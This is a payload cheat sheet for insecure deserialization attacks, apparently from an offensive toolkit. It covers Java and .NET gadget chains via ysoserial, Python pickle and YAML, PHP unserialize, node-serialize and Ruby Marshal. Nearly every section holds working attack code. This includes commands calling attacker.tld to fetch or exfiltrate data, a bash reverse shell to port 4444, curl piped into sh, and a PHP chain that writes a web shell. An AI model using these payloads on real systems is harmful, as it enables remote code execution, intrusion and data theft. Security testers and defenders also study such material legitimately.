# PAYLOADS: Deserialization
## Version: 1.0 | Domain: payloads

---

## JAVA — ysoserial
```bash
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.tld/x' > payload.bin
java -jar ysoserial.jar CommonsCollections5 'wget http://attacker.tld/x' > p.bin
java -jar ysoserial.jar Spring1 'id' > p.bin
java -jar ysoserial.jar URLDNS 'http://attacker.tld/' > p.bin   # for blind detection
java -jar ysoserial.jar JRMPClient 'attacker.tld:1099' > p.bin
java -jar ysoserial.jar BeanShell1 'exec("id")' > p.bin
java -jar ysoserial.jar Hibernate1 'id' > p.bin
```

Available chains: CommonsCollections1-7, CommonsBeanutils1, Spring1, Spring2, ROME, BeanShell1, MozillaRhino1, MozillaRhino2, JRMPClient, JRMPListener, URLDNS, Hibernate1, Hibernate2, Click1, Vaadin1, Wicket1, Myfaces1, Myfaces2, JBossInterceptors1, JSON1, AspectJWeaver, FileUpload1.

## .NET — ysoserial.net
```bash
ysoserial.exe -f Json.Net -g ObjectDataProvider -c 'cmd /c calc'
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'cmd /c calc'
ysoserial.exe -f LosFormatter -g TextFormattingRunProperties -c 'cmd /c calc'
ysoserial.exe -f SoapFormatter -g WindowsIdentity -c 'cmd /c calc'
ysoserial.exe -f ObjectStateFormatter -g TextFormattingRunProperties -c 'cmd /c calc'
```

Formatters: BinaryFormatter, NetDataContractSerializer, SoapFormatter, LosFormatter, ObjectStateFormatter, ResourceManagerSerializer, Json.Net (TypeNameHandling != None), DataContractSerializer (with KnownTypes user-controlled), Xaml.

## PYTHON — pickle
```python
import pickle, base64, os
class P:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.tld/$(whoami)',))
print(base64.b64encode(pickle.dumps(P())).decode())
```

```python
import pickle
class E:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (['/bin/sh','-c','bash -i >& /dev/tcp/ATTACKER/4444 0>&1'],))
open('p.pickle','wb').write(pickle.dumps(E()))
```

## PYTHON — yaml
```yaml
!!python/object/apply:os.system ["id"]
!!python/object/new:subprocess.Popen [["id"]]
!!python/object/apply:subprocess.Popen [["/bin/sh","-c","curl http://attacker.tld/x|sh"]]
```

## PHP — unserialize
```php
// Magic methods invoked: __destruct, __wakeup, __toString, __call, __get, __set
// PoP chain example:
class Logger {
  public $logfile = '/var/www/html/shell.php';
  public $content = '<?php system($_GET[c]);?>';
  function __destruct() { file_put_contents($this->logfile, $this->content); }
}
echo serialize(new Logger());
// O:6:"Logger":2:{s:7:"logfile";s:25:"/var/www/html/shell.php";s:7:"content";s:30:"<?php system($_GET[c]);?>";}
```

## NODE — node-serialize
```javascript
// Vulnerable: serialize.unserialize(input)
// Payload (function literal IIFE):
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',(e,d)=>require('http').get('http://attacker.tld/?d='+encodeURIComponent(d)))}()"}
```

## RUBY — Marshal
```ruby
require 'erb'
e = ERB.allocate
e.instance_variable_set :@src, 'system("id")'
e.instance_variable_set :@filename, 'x'
e.instance_variable_set :@lineno, 1
m = Gem::Installer.allocate
m.instance_variable_set :@pre_install_hooks, [e.method(:result)]
puts Marshal.dump(m).unpack('H*')
```

## REFERENCES
ysoserial / ysoserial.net, frohoff blog, portswigger insecure-deserialization labs
